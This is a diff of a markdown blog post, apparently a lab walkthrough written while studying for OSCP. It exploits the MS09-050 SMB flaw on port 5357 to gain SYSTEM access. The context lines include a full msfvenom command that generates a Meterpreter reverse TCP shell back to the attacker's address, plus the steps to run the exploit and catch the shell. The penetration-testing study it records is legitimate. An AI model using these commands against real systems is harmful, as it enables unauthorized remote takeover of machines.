@@ -33,11 +33,11 @@ When you Google "port 5357 exploit" (not even including wsdapi), you get [this M
 
 I decide to go with the python3 one [here](https://github.com/sec13b/ms09-050_CVE-2009-3103/blob/main/MS09_050_2.py), but they all have a section for shell code, and you can see at the comment the command run to generate it. 
 
-![Internal1.png](/assets/images/Internal/Internal1.png){: .center-aligned width="600px"}
+![Internal1.png](/assets/images/Internal/Internal1.png){: .responsive-image}
 
 I change the command for my own purposes: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.183 LPORT=445  EXITFUNC=thread  -f python -v shell`. 
 
-![Internal2.png](/assets/images/Internal/Internal2.png){: .center-aligned width="600px"}
+![Internal2.png](/assets/images/Internal/Internal2.png){: .responsive-image}
 
 And then paste my own output into the exploit code. From there it's as simple as running: `python3 exploit.py $targetIP`. Initially I get an error:
 
@@ -48,19 +48,19 @@ ERROR: No matching distribution found for smb
 
 But this can be overcome with `pip3 install pysmb`. After that, I get a hit on my reverse shell:
 
-![Internal3.png](/assets/images/Internal/Internal3.png){: .center-aligned width="600px"}
+![Internal3.png](/assets/images/Internal/Internal3.png){: .responsive-image}
 
 And it hangs and dies. Maybe I'll go back to the exploit-db one... Wait. I see I used msfvenom for a meterpreter shell when I attempt to run the same command again. And I do, and it hangs again. At this point I go back to the exploit-db one, but it's in python2, which doesn't seem to accept that I have pysmb installed, and I can't seem to install it. 
 
 I think a little bit more about the code and notice this section.
 
-![Internal4.png](/assets/images/Internal/Internal4.png){: .center-aligned width="600px"}
+![Internal4.png](/assets/images/Internal/Internal4.png){: .responsive-image}
 
 It specifies metasploit, and that makes sense because the shell code given is a meterpreter shell which requires metasploit. But I don't want to use meterpreter or metasploit because I am studying for the OSCP exam, and you can only use Metasploit on one box, so I'd like to save it as best as I can. So I try to remove this code and run it without, but that doesn't work. In fact, it doesn't even establish a connection, so I think I must be going backwards. 
 
 Instead, I decide to try to use metasploit, but only `exploit/multi/handler` which we can use on the exam. I put the `stager_sysenter_hook` code back where it was in the exploit, and upload the payload, LHOST, and LPORT options for the msf handler, and then run the code again. 
 
-![Internal5.png](/assets/images/Internal/Internal5.png){: .center-aligned width="600px"}
+![Internal5.png](/assets/images/Internal/Internal5.png){: .responsive-image}
 
 And voila! It looks like we already have `NT Authority\System` privilges so we're done here. 
 
